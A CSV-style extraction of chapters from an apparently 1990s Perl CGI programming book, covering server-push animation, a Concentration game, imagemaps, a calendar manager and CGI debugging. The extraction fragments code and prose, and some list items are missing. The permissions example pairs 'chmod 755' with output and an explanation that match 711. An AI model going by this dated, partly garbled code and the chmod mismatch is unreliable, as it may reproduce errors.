"information as system load averages, stock prices, or sports scores. However, programs like these can heavily tax ",NA,NA
"the host machine, although they may be fun and entertaining. So you should use them only if there is an absolute ",NA,NA
need to do so.,NA,NA
"To summarize the method used in this example: First we check that the browser is Netscape Navigator, version ",NA,NA
1.1 or higher. That's because Netscape is the only browser that currently supports server push. We then generate a ,NA,NA
"new image every few seconds and send it to the client. To create the image, we'll use the same ",NA,NA
gd,NA,NA
 extension to ,NA,NA
Perl that we showed in ,NA,NA
"Chapter 6, ",NA,NA
Hypermedia Documents,NA,NA
. We have to send the data as a special MIME type,NA,NA
called ,NA,NA
multipart/x-mixed-replace,NA,NA
 so that the client replaces each old image with the new one. Following the ,NA,NA
"MIME standard, we send an ""--End--"" string at the end of each image. Here is the code:",NA,NA
#!/usr/local/bin/perl5,NA,NA
use GD; ,NA,NA
$| = 1;,NA,NA
$font_length = 8;,NA,NA
$font_height = 16; ,NA,NA
"$boundary_string = ""\n"" . ""--End"" . ""\n"";",NA,NA
"$end_of_data = ""\n"" . ""--End--"" . ""\n"";",NA,NA
The program turns output buffering off by setting Perl's ,NA,NA
$|,NA,NA
 variable. The boundary strings for server push are ,NA,NA
defined.,NA,NA
$delay_time = 5; ,NA,NA
$max_updates = 10;,NA,NA
The $,NA,NA
delay_time,NA,NA
 variable reflects the time between image updates. The maximum number of updates performed,NA,NA
by this program is set to 10. The reason for setting these variables is so that the user does not tax the system by ,NA,NA
watching the updates for an infinite amount of time.,NA,NA
"print ""HTTP/1.0 200 OK"", ""\n""; ",NA,NA
This CGI script outputs the complete HTTP header (see ,NA,NA
"Chapter 3, ",NA,NA
Output from the Common Gateway Interface,NA,NA
). ,NA,NA
Server push animation appears smooth only if buffering is turned off and a complete header is output.,NA,NA
$browser = $ENV{'HTTP_USER_AGENT'}; ,NA,NA
if ($browser =~ m#^Mozilla/(1\.[^0]|[2-9])#) {,NA,NA
" print ""Content-type: multipart/x-mixed-replace;boundary=End"", ""\n"";",NA,NA
 ,NA,NA
print $boundary_string;,NA,NA
This ,NA,NA
if,NA,NA
" block runs if the browser is Netscape Navigator, version 1.1 or higher.",NA,NA
 for ($loop=0; $loop < $max_updates; $loop++) {,NA,NA
 &display_time ();,NA,NA
 print $boundary_string;,NA,NA
 sleep ($delay_time);,NA,NA
 },NA,NA
The ,NA,NA
display_time,NA,NA
" subroutine determines the current time, creates an image, outputs the ",NA,NA
image/gif,NA,NA
" MIME type, ",NA,NA
and displays the image. The boundary string is sent to the browser indicating the end of image data. The ,NA,NA
sleep ,NA,NA
command then waits for the specified amount of time.,NA,NA
" &display_time (""end"");",NA,NA
 print $end_of_data;,NA,NA
"Once the loop is terminated, the ",NA,NA
display_time,NA,NA
" subroutine is called one final time, with an argument. The ""end"" ",NA,NA
"argument instructs the subroutine to draw the clock in a different way--as we will soon see. Finally, the last ",NA,NA
boundary string is sent to the browser.,NA,NA
} else {,NA,NA
" &display_time (""end""); ",NA,NA
} ,NA,NA
exit(0);,NA,NA
"If the browser does not support server push, the ",NA,NA
display_time,NA,NA
 subroutine is called just once to display a static ,NA,NA
image of the current time.,NA,NA
The ,NA,NA
display_time,NA,NA
 subroutine does most of the work for the program:,NA,NA
sub display_time ,NA,NA
{,NA,NA
 local ($status) = @_;,NA,NA
" local ($seconds, $minutes, $hour, $ampm, $time, $time_length,",NA,NA
" $x, $y, $image, $black, $color);",NA,NA
" print ""Content-type: image/gif"", ""\n\n"";",NA,NA
" ($seconds, $minutes, $hour) = localtime (time);",NA,NA
 if ($hour > 12) {,NA,NA
 $hour -= 12;,NA,NA
" $ampm = ""pm"";",NA,NA
 } else {,NA,NA
" $ampm = ""am"";",NA,NA
 },NA,NA
 if ($hour == 0) {,NA,NA
 $hour = 12;,NA,NA
 },NA,NA
" $time = sprintf (""%02d:%02d:%02d %s"", $hour, $minutes, $seconds, $ampm);",NA,NA
The current time is formatted and stored in the variable ,NA,NA
$time,NA,NA
. The output of this variable will look like this: ,NA,NA
09:27:03 pm,NA,NA
.,NA,NA
 $time_length = length($time);,NA,NA
 $x = $font_length * $time_length;,NA,NA
 $y = $font_height;,NA,NA
"The size of the image is calculated, based on the length of the ",NA,NA
$time,NA,NA
 string multiplied by the font dimensions.,NA,NA
" $image = new GD::Image ($x, $y);",NA,NA
" $black = $image->colorAllocate (0, 0, 0);",NA,NA
A new image is created with black as the background color.,NA,NA
" if ($status eq ""end"") {",NA,NA
" $color = $image->colorAllocate (0, 0, 255);",NA,NA
 $image->transparent ($black);,NA,NA
 } else {,NA,NA
" $color = $image->colorAllocate (255, 0, 0); ",NA,NA
},NA,NA
"If the argument passed to this script is ""end"", the color of the text is set to blue. In addition, black is set as the ",NA,NA
"transparent color. In other words, black will not appear in the image, and as a result the blue text will appear ",NA,NA
"without any image border. If an argument was not passed, the text color is set to red.",NA,NA
},NA,NA
" $image->string (gdLargeFont, 0, 0, $time, $color); ",NA,NA
print $image->gif;,NA,NA
"Finally, the image is displayed to standard output.",NA,NA
Forking/Spawning Child,NA,NA
Processes,NA,NA
Game of Concentration,NA,NA
11.2 Game of Concentration,"Up to this point, we have discussed reasonably useful applications. So it is time now to look at some pure 
  
 entertainment: the game of Concentration (also called Memory). The game consists of an arbitrary number of tiles, 
 where each tile exactly matches one other tile. The value (or picture) ""under"" each tile is hidden from the user. 
 Figure
  
 11.1
  shows what the initial screen looks like.
  
 Figure 11.1: First game screen
  
 [Graphic: 
  
 Figure 11-1]
  
 When the user selects a tile, the value is displayed. The user can select two tiles at a time. If they match, the values 
 behind the tiles remain displayed. The object of the game is to find all matching tiles in as few looks as possible. 
 Figure 11.2
  shows a successful match.
  
 Figure 11.2: Game screen with successful match
  
 [Graphic: 
  
 Figure 11-2]
  
 The new technique introduced by this example is how to store the entire state of the board in the HTML code sent to 
 the browser. Each click by the user sends the state of the tiles back to the server so that a correct new board can be 
 generated. This is how you access the program for the first time:
  
 http://some.machine/cgi-bin/concentration.pl
  
 This program displays a board, where each tile links back to this program with a query string like this:
  
 http://some.machine/cgi-bin/concentration.pl?
  
 %258%c8%7d0%834%578%4b0%a8c%dac%ce4%bb8%1450%2bc%ea6%960%6a4%708%1%0
  
 The query string actually contains all of the board information (encrypted so that you can't cheat!) as well as the user 
 selections. This is yet another way to store information when multiple sessions are involved, if you don't want to use 
 temporary files and magic cookies. It is not a general solution for all applications, because the length of the query 
 string can be truncated by the browser or the server--see 
 Chapter 4, 
 Forms and CGI
 . But in this case, the size of the
  
 data is small, so it is perfect.
  
 When a certain tile is selected, the program receives a query like the one above. It processes the query, checks to see 
 if the two user selections match, and then creates a new series of query strings for each tile. The process is repeated 
 until the game is finished.
  
 Now for the code:
  
 #!/usr/local/bin/perl 
  
 @BOARD = ();",NA
11.3 Introduction to Imagemaps,"You've almost certainly seen imagemaps on your trips across the Web. They are pictures with different parts that you 
 can click, and each part takes you to a different URL. Imagemaps let web sites offer pictorial melanges where you can 
 select where you want to go, as an alternative to presenting a boring list of text items.
  
 In this book, the imagemap is generated and interpreted within the program. But you should probably see how most 
 people use conventional imagemaps. They start with a crisp graphic image (preferably GIF, as it is more portable than 
 JPEG). Once they select an image, they must define various hotspots (or areas where users can click), and identify 
 them in an imagemap file in the following format:
  
  shape URL coordinate1, coordinate2, ... coordinaten
  
 where 
 shape
  can be ""circle,"" ""poly,"" or ""rect""; 
 URL
  is the file you want to display in response to the user's click; and 
 the coordinates are measured in pixels. Programs exist to help you determine the coordinates of the regions you want 
 to mark within an image. Here is an example of an imagemap file (the following applies to the NCSA server only):
  
 default http://my.company.com 
  
 rect http://some.machine.com 0, 0, 50, 50 
  
 poly http://www.machine.com/graphic.gif 100, 120, 230, 250, 320, 
 75 circle http://their.machine.com/circle.gif 100, 100, 150, 150, 
 100 
  
 The next step is to edit the 
 imagemap.conf
  configuration file and add an entry like the following:[1]
  
 [1] Modern versions of the NCSA HTTPd server no longer use the 
 imagemap.conf
  file. You can pass the 
 map file as extra path information to the imagemap program directly, like so:
  
 <A HREF=""/cgi-bin/imagemap/graphics/dragon.map""> 
 <IMG SRC=""/graphics/dragon.gif"" ISMAP>
  
 where the map file (
 dragon.map
 ) is stored in the 
 /graphics
  directory. Note that this is a virtual path.
  
  dragon: /graphics/dragon.map
  
 The first part of this statement is the name of the imagemap, while the second part is the relative path to the imagemap 
 data file. Now, the imagemap is all but set up. The only step that needs to be performed is to add the appropriate 
 HTML in a document to access the imagemap:
  
  <A HREF=""/cgi-bin/imagemap/dragon""><IMG SRC=""/graphics/dragon.gif"" 
 ISMAP></A>
  
 When the user clicks on a point in the image, the client sends the coordinates as query information, and the 
 imagemap name as an extra path to the imagemap CGI program (which comes with most servers). Here is what a 
 typical HTTP client request might look like:
  
  GET /cgi-bin/imagemap/dragon?53,87",NA
11.4 Calendar Manager,"As the final example for this book, we will look at a very complicated program that uses a combination of CGI techniques: 
 database manipulation, recursive program invocation, and virtual imagemaps.
  
 What are virtual imagemaps? As we explained in the previous section, most people who provide images for users to click on 
 have to store information about the imagemap in a file. The program I'm about to show you, however, determines the region in 
 which the user clicked, and performs the appropriate action on the fly--without using any auxiliary files or scripts. Let's discuss 
 the implementation of these techniques more thoroughly.
  
 If a graphic browser is used to access this Calendar program, an imagemap of the current calendar is displayed listing all 
 appointments. When an area on the image is clicked, the program calculates the date that corresponds to that region, and 
 displays all the appointments for that date. Another important thing to note about the program is the way in which the 
 imagemap is created--the script is actually executed twice (more on this later). 
 Figure 11.4
  shows a typical image of the
  
 calendar.
  
 Figure 11.4: Calendar on graphics browser
  
 [Graphic: 
  
 Figure 11-4]
  
 If the user accesses this program with a text browser, a text version of the calendar is displayed. You have seen this kind of dual 
 use in a lot of programs in this book; you should design programs so that users with both types of browsers can access and use a 
 CGI program. The text output is shown in 
 Figure 11.5
 .
  
 Figure 11.5: Calendar on text browser
  
 [Graphic: 
  
 Figure 11-5]
  
 Since the same program handles many types of queries and offers a lot of forms and displays, it can be invoked in several 
 different ways. Most users will start by clicking on a simple link without a query string, which causes an imagemap (or text 
 equivalent, for non-graphics browsers) of the current month to be displayed:
  
 http://some.machine/cgi-bin/calendar.pl
  
 If the user then selects the ""Full Year Calendar"" option, the following query is passed:
  
 http://some.machine/cgi-bin/calendar.pl?action=full
  
 When the user clicks an area on the image (or selects a link on the text calendar), the following query is sent:
  
  http://some.machine/cgi-bin/calendar.pl?action=view&date=5&month=11/1995
  
 The program will then display all the appointments for that date. The 
 month
  field stores the selected month and year. Calendar 
 Manager allows the user to set up appointments for any month, so it is always necessary to store the month and year 
 information.
  
 To be useful, of course, this program has to do more than offer a view of the calendar. It must allow changes and searches as 
 well. Four actions are offered:
  
 G   
 Add an appointment",NA
Main Program,"Enough discussion--let's look at the program:
  
 #!/usr/local/bin/perl5
  
 use GD;
  
 use Sprite;
  
 $webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)"";
  
 $cal = ""/usr/bin/cal"";
  
 The UNIX 
 cal
  utility displays a text version of the calendar. See the 
 draw_text_calendar
  subroutine to see what the output of 
 this command looks like.
  
 $database = ""/home/shishir/calendar.db"";
  
 $delimiter = ""::"";
  
 The database uses the ""::"" string as a delimiter and contains six fields for each calendar event: 
 ID
 , 
 Month
 , 
 Day
 , 
 Year
 , 
 Keywords
 , and 
 Description
 . The 
 ID
  field uniquely identifies an appointment based on the time of creation. The 
 Month 
 (numerical), 
 Day
 , and 
 Year
  are self-explanatory. One thing to note here is that the 
 Year
  is stored as a four-digit number (i.e., 
 1995, not 95).
  
 The 
 Keywords
  field is a short description of the appointment. This is what is displayed on the graphic calendar. And finally, 
 the 
 Description
  field should contain a more lengthy explanation regarding the appointment. Here is the format for a typical 
 appointment file:
  
 ID::Month::Day::Year::Keywords::Description 
  
 796421318::11::02::1995::See Professor::It is important that I see the professor
  
 806421529::11::03::1995::ABC Enterprises::Meet Drs. Bird and McHale about job!!
  
 805762393::11::03::1995::Luncheon Meeting::Travel associates
  
 Now to create and manipulate the data:",NA
The Database,"In the rest of this chapter I'm going to explain the various subroutines that set and retrieve data, create a display, and parse 
 input. We'll start with some database functions. You'll also find incidental routines here, which I've written as conveniences 
 because their functions appear so often.
  
 The following subroutine checks to see if the calendar database exists. If not, we create one. This job is simple, since we're 
 using a flat file with Sprite as an interface: we just open a file with the desired name and write a one-line header.
  
 sub check_database 
  
 {
  
  local ($exclusive_lock, $unlock, $header);
  
  $exclusive_lock = 2;
  
  $unlock = 8;
  
  if (! (-e $database) ) {
  
  
  
  if ( open (DATABASE, "">"" . $database) ) {
  
  
  
  
  flock (DATABASE, $exclusive_lock);
  
  
  
  
  $header = join ($delimiter, ""ID"", ""Month"", ""Day"",
  
  
  
  
  ""Year"", ""Keywords"", ""Description"");
  
  
  
  
 print DATABASE $header, ""\n"";
  
  
  
  
  flock (DATABASE, $unlock);
  
  
  
  
  close (DATABASE);
  
  
  
  } else {
  
  
  
  
  &return_error (500, ""Calendar Manager"",
  
  
  
  
  
  ""Cannot create new calendar database."");
  
  
  }
  
  } 
  
 }
  
 If the database does not exist, a header line is output:
  
 ID::Month::Day::Year::Keywords::Description 
  
 The following subroutine just returns an error; it is defined for convenience and used in 
 open_database
 .",NA
Forms and Displays,"In this section you'll find subroutines that figure out what the user has asked for and display the proper output. All searches, 
 additions, and so forth take place here. Usually, a database operation takes place in two steps: one subroutine displays a form, 
 while another accepts input from the form and accesses the database.
  
 Let's start out with 
 display_year_calendar
 , which displays the full year calendar.
  
 sub display_year_calendar 
  
 {
  
  
  local (@full_year);
  
  
  @full_year = `$cal $current_year`;",NA
The imagemap display,"Now let's change gears and discuss some of the more complicated subroutines, the first one being 
 display_month_calendar
 . 
 This subroutine either draws a calendar, or interprets the coordinates clicked by the user. Because we're trying to do a lot with 
 this subroutine (and run it in several different situations), don't be surprised to find it rather complicated. There are three things 
 the subroutine can do:
  
 G 
  
 G 
  
 G 
  
 In the simplest case, this subroutine is called when no coordinate information has been passed to the program. It then 
 creates a calendar covering a one-month display. The 
 output_HTML
  routine is called to do this (assuming that the user 
 has a graphics browser).
  
 If coordinate information is passed, the subroutine figures out which date the user clicked and displays the appointments 
 for that date, using the 
 display_all_appointments
  subroutine.
  
 Finally, if the user has a non-graphics browser, 
 draw_text_calendar
  is called to create the one-month display. This 
 display contains hypertext links to simulate the functions that an imagemap performs in the graphics version.
  
 But more subtleties lie in the interaction between the subroutines. In order to generate a calendar for a particular month 
 requested by the user, I have the program invoke itself in a somewhat complex way.
  
 Let me start with our task here: to create an image dynamically. Most CGI programmers create a GIF image, store it in a file, 
 and then create an imagemap based on that temporary file. This is inefficient and involves storing information in temporary 
 files. What I do instead is shown in 
 Figure 11.6
 .
  
 Figure 11.6: Dynamic imagemap creation
  
 [Graphic: 
  
 Figure 11-6]
  
 The program is invoked for the first time, and calls 
 output_HTML
 . This routine sends the browser some HTML that looks like 
 this:
  
 <A HREF=""/cgi-bin/calendar.pl/11/1995""> 
  
 <IMG SRC=""/cgi-bin/calendar.pl?month=11/1995&draw_imagemap"" ISMAP></A> 
  
 Embedding an <IMG> tag in an <A> tag is a very common practice--an image with a hypertext link. But in most <IMG> tags, 
 the SRC attribute points to a 
 .gif
  file. Here, instead, it points back to our program.
  
 So what happens when the browser displays the HTML? It sends a request back to the server for the image, and the server runs 
 this program all over again. (As I said before, the program invokes itself.) This time, an image of a calendar is returned, and the 
 browser happily completes the display.
  
 You may feel that I'm playing games with HTML here, but it's all very legitimate and compatible with the way a web client 
 and server work. And there's no need for temporary files with the resulting delays and cleanup.
  
 Let me explain one more detail before we launch into the code. The decision about whether to display a calendar is determined 
 by a field in the <IMG> tag you saw, the 
 draw_imagemap
  field. When this field is passed, the program creates an image of a 
 calendar. When the field is not passed, 
 output_HTML
  is called. So we have to run the program once without 
 draw_imagemap
 , 
 let it call 
 output_HTML
 , and have that subroutine run the program again with 
 draw_imagemap
  set.
  
 Once you understand the basic logic of the program, the 
 display_month_calendar
  subroutine should be fairly easy to follow.
  
 sub display_month_calendar",NA
Graphics,"Up to this point, we have not discussed how the graphic calendar is created, or how the coordinates are interpreted on the fly. 
 The next three subroutines are responsible for performing those tasks. The first one we will look at is a valuable subroutine that 
 calculates various aspects of the graphic calendar.
  
 sub graphics_calculations 
  
 {
  
  
  local (*GIF) = @_;
  
 This subroutine expects a symbolic reference to an associative array as an argument. The purpose of the subroutine is to 
 populate this array with numerous values that aid in implementing a graphic calendar.
  
  $GIF{'first_day'} = &get_first_day ($current_month, $current_year);
  
 The 
 get_first_day
  subroutine returns the day number for the first day of the specified month, where Sunday is 0 and Saturday is 
 6. For example, the routine will return the value 3 for November 1995, which indicates a Wednesday.
  
  $GIF{'last_day'}  = &get_last_day ($current_month, $current_year);
  
 The 
 get_last_day
  subroutine returns the number of days in a specified month. It takes leap years into effect.
  
  $GIF{'no_rows'} = ($GIF{'first_day'} + $GIF{'last_day'}) / 7; 
 if ($GIF{'no_rows'} != int ($GIF{'no_rows'})) {
  
  $GIF{'no_rows'} = int ($GIF{'no_rows'} + 1);
  
  }
  
 This calculates the number of rows that the calendar will occupy. We simply divide the number of days in this month by the 
 number of days in a week, and round up if part of a week is left.
  
 Now we are going to define some coordinates.
  
  $GIF{'box_length'} = $GIF{'box_height'} = 100; 
 $GIF{'x_offset'}   = $GIF{'y_offset'} = 10;",NA
12. Debugging and Testing CGI ,NA,NA
Applications,NA,NA
Contents: ,NA,NA
Common Errors ,NA,NA
Programming/System Errors,NA,NA
Environment Variables,NA,NA
Logging and Simulation,NA,NA
CGI Lint--A Debugging/Testing Tool,NA,NA
Set UID/GID Wrapper,NA,NA
The hardest aspect of developing CGI applications on the Web is the testing/debugging phase. The ,NA,NA
"main reason for the difficulty is that applications are being run across a network, with client and ",NA,NA
"server interaction. When there are errors in CGI programs, it is difficult to figure out where they lie.",NA,NA
"In this chapter, we will discuss some of the common errors in CGI script design, and what you can do ",NA,NA
"to correct them. In addition, we will look at a debugging/lint tool for CGI applications, called CGI ",NA,NA
"Lint, written exclusively for this book.",NA,NA
12.1 Common Errors,NA,NA
"Initially, we will discuss some of the simpler errors found in CGI application design. Most CGI ",NA,NA
"designers encounter these errors at one time or another. However, they are extremely easy to fix.",NA,NA
CGI Script in Unrecognized Directory,NA,NA
Most servers require that CGI scripts reside in a special directory (,NA,NA
/cgi-bin,NA,NA
"), or have certain file ",NA,NA
"extensions. If you try to execute a script that does not follow the rules for a particular server, the ",NA,NA
"server will simply retrieve and display the document, instead of executing it. For example, if you have ",NA,NA
the following two lines in your NCSA server resource map configuration file (,NA,NA
srm.conf,NA,NA
):,NA,NA
ScriptAlias  /my-cgi-apps/ /usr/local/bin/httpd_1.4.2/cgi-bin/,NA,NA
AddType      application/x-httpd-cgi   .cgi .pl,NA,NA
"the server will execute only scripts with URLs that either contain the string ""/my-cgi-apps,"" or have a ",NA,NA
file extension of ,NA,NA
.pl,NA,NA
 or ,NA,NA
.cgi,NA,NA
. Take a look at the following URLs and figure out which ones the server,NA,NA
will try to execute:,NA,NA
http://some.machine.com/cgi-bin/clock.tcl,NA,NA
http://my.machine.edu/my-cgi-apps/clock.pl,NA,NA
http://your.machine.org/index.cgi,NA,NA
http://their.machine.net/cgi-bin/animation.pl,NA,NA
"If you picked the last three, then you are correct! Let's look at why this so. The first one will not get ",NA,NA
"executed because the script is neither in a recognized directory (my-cgi-apps), nor does it have a valid ",NA,NA
extension (,NA,NA
.cgi,NA,NA
 or ,NA,NA
.pl,NA,NA
"). The second one refers to the correct CGI directory, while the last two have ",NA,NA
valid extensions.,NA,NA
Missing Interpreter Line,NA,NA
"If your CGI application is a script of some sort (a C Shell, Perl, etc.), it must contain a line that begins ",NA,NA
"with #! (a ""sharp-bang,"" or ""shebang""), or else the server will not know what interpreter to call to ",NA,NA
"execute the script. You don't have to worry about this if your CGI program is written in C/C++, or any ",NA,NA
"other language that creates a binary. This leads us to another closely related problem, as we will soon ",NA,NA
see.,NA,NA
File Permission Problems,NA,NA
The CGI script must be executable by the server. Most servers are set up to run with the user ,NA,NA
"identification (UID) of ""nobody,"" which means that your scripts have to be world executable. The ",NA,NA
"reason for this is that ""nobody"" has minimal privileges. You can check the permissions of your script ",NA,NA
on UNIX systems by using the ,NA,NA
ls,NA,NA
 command:,NA,NA
% ls -ls /usr/local/bin/httpd_1.4.2/cgi-bin/clock.pl,NA,NA
 4 -rwx------  1 shishir      3624 Aug 17 17:59 clock.pl*,NA,NA
The second field lists the permissions for the file. This field is divided into three parts: the privileges ,NA,NA
"for the owner, the group, and the world (from left to right), with the first letter indicating the type of ",NA,NA
"the file: either a regular file, or a directory. In this example, the owner has sole permission to read, ",NA,NA
"write, and execute the script.",NA,NA
"If you want the server (running as ""nobody"") to be able to execute this script, you have to issue the ",NA,NA
following command:,NA,NA
% chmod 755 clock.pl,NA,NA
 4 -rwx--x--x  1 shishir      3624 Aug 17 17:59 clock.pl*,NA,NA
The ,NA,NA
chmod,NA,NA
 command modifies the permissions for the file. The octal code of 711 indicates read (octal ,NA,NA
"4), write (octal 2), and execute (octal 1) permissions for the owner, and execute permissions for group ",NA,NA
members and all other members.,NA,NA
Malformed Header from Script,NA,NA
"All CGI applications must output a valid HTTP header, followed by a blank line, before any other ",NA,NA
"data. In other words, two newline characters have to be output after the header. Here is how the output",NA,NA
should look:,NA,NA
Content-type: text/html ,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Output from CGI Script</TITLE></HEAD> ,NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"The headers must be output before any other data, or the server will generate a server error with a ",NA,NA
status of 500. So make it a habit to output this data as early in the script as possible. To make it easier ,NA,NA
"for yourself, you can use a subroutine like the following to output the correct information:",NA,NA
sub output_MIME_header ,NA,NA
{,NA,NA
 local ($type) = @_;,NA,NA
" print ""Content-type: "", $type, ""\n\n""; ",NA,NA
},NA,NA
Just remember to call it at the beginning of your program (before you output anything else). Another ,NA,NA
"problem related to this topic has to do with how the script executes. If the CGI program has errors, ",NA,NA
"then the interpreter, or compiler, will produce an error message when trying to execute the program. ",NA,NA
"These error messages will inevitably be output before the HTTP header, and the server will complain.",NA,NA
What is the moral of this? Make sure you check your script from the command line before you try to ,NA,NA
"execute it on the Web. If you are using Perl, you can use the ",NA,NA
-wc,NA,NA
 switch to check for syntax errors:,NA,NA
% perl -wc clock.pl ,NA,NA
"syntax error in file clock.pl at line 9, at EOF ",NA,NA
clock.pl had compilation errors.,NA,NA
"If there are no errors (but there are warnings), the Perl interpreter will display the following:",NA,NA
% perl -wc clock.pl ,NA,NA
"Possible typo: ""opt_g"" at clock.pl line 9. ",NA,NA
"Possible typo: ""opt_u"" at clock.pl line 9. ",NA,NA
"Possible typo: ""opt_f"" at clock.pl line 9.",NA,NA
clock.pl syntax OK,NA,NA
Warnings indicate such things as possible typing errors or use of uninitialized variables. Most of the ,NA,NA
"time, these warnings are benign, but you should still take the time to look into them. Finally, if there ",NA,NA
"are no warnings or errors to be displayed, Perl will output the following:",NA,NA
% perl -wc clock.pl ,NA,NA
clock.pl syntax OK,NA,NA
So it is extremely important to check to make sure the script runs without any errors on the command ,NA,NA
line before trying it out on the Web.,NA,NA
Calendar Manager,NA,NA
Programming/System Errors,NA,NA
12.2 Programming/System Errors,NA,NA
"Now that we have looked at some of the common errors in CGI application design, let's focus on programming ",NA,NA
errors that can cause unexpected results. There is one extremely important point that you should be aware of:,NA,NA
"Always check the return value of all the system commands, including eval, open, and system.",NA,NA
What does this mean? The next few sections will describe some of the programming errors that occur frequently if ,NA,NA
you are not careful.,NA,NA
"Opening, Reading, and Writing Files",NA,NA
"Since the server is running as a user that has minimal privileges (usually ""nobody""), you must be careful when ",NA,NA
reading from or writing to files. Here is an example:,NA,NA
"open (FILE, ""<"" . ""/usr/local/httpd_1.4.2/data""); ",NA,NA
while (<FILE>) {,NA,NA
 print; ,NA,NA
} ,NA,NA
close (FILE);,NA,NA
"Now, what if the file that you are trying to read is not accessible? The file handle FILE will not be created, but the ",NA,NA
"while loop tries to iterate through that file handle. Fortunately, Perl does not get upset, but you will not have any ",NA,NA
"data. So, it is always better to check the status of the ",NA,NA
open,NA,NA
" command, like this:",NA,NA
"open (FILE, ""<"" . ""/usr/local/httpd_1.4.2/data"") || ",NA,NA
" &call_some_subroutine (""Oops! The read failed. We need to do something."");",NA,NA
This will ensure that the subroutine ,NA,NA
call_some_subroutine,NA,NA
" gets called if the script cannot open the file. Now, say you ",NA,NA
want to write to an output file:,NA,NA
"open (FILE, "">"" . ""/usr/local/httpd_1.4.2/data""); ",NA,NA
"print FILE ""Line 1"", ""\n; ",NA,NA
"print FILE ""Line 2"", ""\n""; ",NA,NA
close (FILE);,NA,NA
"Again, you should check for the status of the ",NA,NA
open,NA,NA
 command:,NA,NA
"open (FILE, "">"" . ""/usr/local/httpd_1.4.2/data"") ||",NA,NA
 ,NA,NA
"&call_some_subroutine (""Oops! The write failed. ",NA,NA
" We need to do something"".);",NA,NA
This is true when doing such tasks as updating a database or creating a counter data file. In order for the server to ,NA,NA
"write to a file, it has to have write privileges on the file as well as the directories in which the file is located.",NA,NA
Pipes and the open Command,NA,NA
"We used pipes to perform data redirection in numerous examples in this book. Unlike files, there is no easy way to ",NA,NA
check to see if the contents of the pipe have been successfully executed. Let's take a look at a simple example:,NA,NA
"open (FILE, ""/usr/bin/cat /home/shishir/.login |"") ",NA,NA
" || &call_some_subroutine (""Error opening pipe!""); ",NA,NA
while (<FILE>) {,NA,NA
 print; ,NA,NA
} ,NA,NA
close (FILE);,NA,NA
If the ,NA,NA
cat,NA,NA
" command cannot be found by the shell, you might expect that an error status will be returned by the ",NA,NA
open ,NA,NA
"command, and thus the ",NA,NA
call_some_subroutine,NA,NA
" function will be called. However, this is not the case. An error status ",NA,NA
"will be returned only if a pipe cannot be created (which is almost never the case). Due to the way the shell operates, ",NA,NA
the status of the command is available only after the file handle is closed. Here is an example:,NA,NA
"open (FILE, ""/usr/bin/cat /home/shishir/.login |"") ",NA,NA
" || &call_some_subroutine (""Error opening pipe!""); while ",NA,NA
(<FILE>) {,NA,NA
 print; ,NA,NA
} ,NA,NA
close (FILE); ,NA,NA
if ($?) {,NA,NA
" &call_some_subroutine (""Error in executing command!""); ",NA,NA
} ,NA,NA
"Once the file handle is closed, Perl saves the return status in the variable ",NA,NA
$?,NA,NA
. This is the method that you should use ,NA,NA
for all system commands.,NA,NA
"There is another method for determining the status of the pipe before the file handle is closed, though it is not ",NA,NA
always 100% reliable. It involves checking the process ID (PID) of the process that is spawned by the ,NA,NA
open ,NA,NA
command:,NA,NA
"$pid = open (FILE, ""/usr/bin/cat /home/shishir/.login |""); ",NA,NA
sleep (2); ,NA,NA
"$status = kill 0, $pid; ",NA,NA
if ($status) {,NA,NA
 while (<FILE>) {,NA,NA
 print;,NA,NA
 },NA,NA
 close (FILE); ,NA,NA
} else {,NA,NA
" &call_some_subroutine (""Error opening pipe!""); ",NA,NA
},NA,NA
This is a neat trick! The ,NA,NA
kill,NA,NA
" statement with an argument of 0 checks the status of the process. If the process is alive, ",NA,NA
"a value of 1 is returned. Otherwise, a 0 is returned, which indicates that the process is no longer alive. The ",NA,NA
sleep ,NA,NA
command ensures a delay so that the value returned by ,NA,NA
kill,NA,NA
 reflects the status of the process.,NA,NA
Common Errors,NA,NA
Environment Variables,NA,NA
12.3 Environment Variables,NA,NA
"If you look back to the counter CGI applications in previous chapters, you will see that we saved the ",NA,NA
"counter data in a text file. Some CGI programmers want to avoid using a file, and try to store the ",NA,NA
information in an environment variable. So they write code that resembles the following:,NA,NA
if ($ENV{'COUNTER'}) {,NA,NA
 $ENV{'COUNTER'}++;,NA,NA
} else {,NA,NA
 $ENV{'COUNTER'} = 1;,NA,NA
} ,NA,NA
"To their surprise, however, the counter value is always the same (1, in this case). The point behind this ",NA,NA
"is that you cannot save any environment variables directly from Perl, although it is possible to do so ",NA,NA
by invoking the shell.,NA,NA
"Basically, when a Perl program is started, a child process is created. And the cardinal rule in UNIX is ",NA,NA
that child processes cannot permanently affect their parent shell.,NA,NA
Programming/System Errors,NA,NA
Logging and Simulation,NA,NA
12.4 Logging and Simulation,NA,NA
"At this point, you might be wondering where all the CGI errors get logged. If you are using the NCSA server, the ",NA,NA
log files directory is the place that holds them. You can manually place debugging messages into the ,NA,NA
error_log,NA,NA
 file ,NA,NA
by doing the following:,NA,NA
"print STDERR ""Calendar v1.0 - Just about to calculate center"", ""\n""; ",NA,NA
$center = ($diameter / 2) + $x_offset; ,NA,NA
"print STDERR ""Calendar v1.0 - Finished calculating. Center = "", $center, ""\n"";",NA,NA
"After the program is finished, you can look at the log file to see the various debugging messages. It is a good ",NA,NA
"practice to insert the name of your program into the message, so you can find it among all of the different messages ",NA,NA
"logged to the file. Another trick you can use is to ""dupe"" (or duplicate) standard error to standard output:",NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
"open (STDERR, "">&"" . STDOUT); ",NA,NA
"print STDERR ""About to execute for loop"", ""\n""; ",NA,NA
for ($loop=0; $loop <= 10; $loop++) {,NA,NA
 $point[$loop] = ($loop * $center) + $random_number;,NA,NA
" print STDERR ""Point number "", $loop, "" is "", $point[$loop], ""\n""; ",NA,NA
} ,NA,NA
close (STDERR);,NA,NA
"In this case, the errors generated by the CGI program will go to the browser as well as to the log file.",NA,NA
Client Simulation,NA,NA
"In order to get a good feel for how the Web works, you should connect to a server and simulate a client's actions. ",NA,NA
You can do this by using the telnet protocol. Here is an example:,NA,NA
% telnet www.ora.com 80 ,NA,NA
Trying 198.112.208.13 ...,NA,NA
Connected to amber.ora.com.,NA,NA
Escape character is '^]'.,NA,NA
GET / HTTP/1.0 ,NA,NA
<HTML><HEAD>,NA,NA
 <TITLE>O'Reilly Home Page</TITLE> ,NA,NA
</HEAD><BODY> ,NA,NA
